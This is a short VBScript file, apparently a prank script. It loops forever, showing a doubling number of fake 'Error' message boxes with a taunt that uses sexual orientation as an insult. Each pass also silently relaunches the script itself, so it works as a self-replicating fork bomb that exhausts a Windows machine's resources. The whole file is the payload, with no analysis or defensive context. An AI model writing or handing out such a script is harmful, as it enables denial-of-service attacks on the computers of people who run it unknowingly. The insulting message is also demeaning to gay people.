Dim messageCount
messageCount = 1

Do
    Dim i
    For i = 1 To messageCount
        MsgBox "Yor are gay!", vbCritical, "Error"
    Next
    messageCount = messageCount * 2
    CreateObject("WScript.Shell").Run WScript.FullName & " """ & WScript.ScriptFullName & """", 0, False
Loop
